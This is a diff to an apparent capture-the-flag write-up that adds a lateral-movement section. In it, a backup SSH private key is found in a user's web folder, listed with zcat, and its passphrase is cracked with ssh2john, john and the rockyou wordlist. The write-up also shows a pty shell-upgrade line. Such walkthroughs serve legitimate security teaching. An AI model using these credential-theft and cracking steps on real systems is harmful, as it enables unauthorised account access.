@@ -64,5 +64,39 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 
 And, we are on the box!
 
+# Lateral Movement
 
+While on the box, we found 'backup-ssh-identity-files' in the following directory:
+
+```
+/home/david/public_www/protected-file-area
+```
+
+<p align="center">
+  <img src="screenshots/10.png" width="738">
+</p>
+
+It contains a Backup SSH Private Key. To list out the contents of this file, use the following command:
+
+```
+zcat backup-ssh-identity-files.tgz
+```
+
+<p align="center">
+  <img src="screenshots/11.png" width="738">
+</p>
+
+Save this key on the local machine and try to brute-force it to find a possible candidate for the passphrase. Use the following commands:
+
+```
+./ssh2john.py id_rsa > id_rsa.hashes
+john -w /usr/share/wordlists/rockyou.txt --format=SSH id_rsa.hashes
+john --show id_rsa.hashes
+```
+
+<p align="center">
+  <img src="screenshots/12.png" width="738">
+</p>
+
+The Passphrase found is ```hunter```
 
